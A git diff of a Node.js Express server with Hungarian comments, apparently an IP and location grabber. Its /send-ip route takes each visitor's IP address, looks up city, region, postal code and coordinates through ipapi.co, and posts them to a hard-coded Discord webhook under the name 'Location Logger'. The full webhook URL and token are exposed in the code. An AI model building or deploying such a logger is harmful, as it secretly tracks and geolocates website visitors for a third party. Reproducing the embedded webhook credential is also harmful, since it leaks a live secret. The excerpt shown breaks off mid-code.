@@ -1,23 +1,24 @@
 const express = require('express');
 const axios = require('axios');
+const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
+
+// Statikus fájlok kiszolgálása (pl. style.css)
+app.use(express.static(path.join(__dirname, 'public'))); // Ha a CSS a 'public' mappában van
 
 // Fixált Discord Webhook URL
 const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Ndt2R6qwVVbh5kVYgBSByLdEAC_mOQa9C7VbMjXxkgLUukRQVOFumbDRs5d1A9u';
 
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
-    // A látogató IP címének lekérése
     const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress || req.ip;
 
     console.log('User IP: ', userIp); // Ellenőrizzük, hogy helyes IP-t kapunk-e
 
-    // IP cím lekérdezése az ipapi API segítségével
     fetch(`https://ipapi.co/${userIp}/json/`)
         .then(geoResponse => geoResponse.json())
         .then(geoData => {
-            // Az adatokat biztonságosan ellenőrizzük, hogy léteznek-e
             const network = geoData.network || 'N/A';
             const city = geoData.city || 'N/A';
             const region = geoData.region || 'N/A';
@@ -25,11 +26,6 @@ app.get('/send-ip', (req, res) => {
             const postal = geoData.postal || 'N/A';
             const latitude = geoData.latitude || 'N/A';
             const longitude = geoData.longitude || 'N/A';
-
-            // Ellenőrizzük, hogy a város és egyéb információk valóban rendelkezésre állnak
-            if (city === 'N/A' && region === 'N/A' && country === 'N/A') {
-                console.log(`A következő adatokat nem sikerült lekérni: Város: ${city}, Régió: ${region}, Ország: ${country}`);
-            }
 
             const message = {
                 username: "Helyszíni Naplózó <3",
